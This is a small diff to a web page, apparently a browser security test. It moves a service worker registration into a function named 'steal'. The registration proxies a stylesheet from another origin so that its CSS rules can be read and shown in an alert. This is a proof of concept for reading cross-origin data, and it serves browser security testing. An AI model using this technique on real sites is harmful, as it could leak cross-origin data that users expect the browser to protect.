@@ -70,16 +70,16 @@ audioCtx.audioWorklet.addModule('audi-work.js').then(() => {
 
 <link rel="stylesheet" href="/catchme">
 <script>
-  navigator.serviceWorker.register('/dysw.js?cors=no-cors&match=catchme&url=https://another-origin.firebaseapp.com/cross-origin.css')
-  .then(reg => {
-      // registration worked
-      console.log('Registration succeeded. Scope is ' + reg.scope);
-    }).catch(function(error) {
-      // registration failed
-      console.log('Registration failed with ' + error);
-  });
-
   function steal() {
+    navigator.serviceWorker.register('/dysw.js?cors=no-cors&match=catchme&url=https://another-origin.firebaseapp.com/cross-origin.css')
+    .then(reg => {
+        // registration worked
+        console.log('Registration succeeded. Scope is ' + reg.scope);
+      }).catch(function(error) {
+        // registration failed
+        console.log('Registration failed with ' + error);
+    });
+
     alert(document.styleSheets[0].cssRules[0].cssText);
   }
 </script>
